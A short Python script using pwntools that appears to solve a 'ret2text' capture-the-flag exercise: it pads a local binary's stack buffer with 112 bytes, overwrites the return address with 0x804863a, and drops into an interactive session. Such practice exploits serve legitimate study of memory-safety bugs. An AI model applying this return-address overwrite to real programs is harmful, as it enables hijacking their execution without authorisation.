from pwn import *

context.log_level = 'debug'
io = process('./ret2text')
io.recvline()
payload= flat(['a'*108, 'a'*4 ,0x804863a])
io.sendline(payload)
io.interactive()
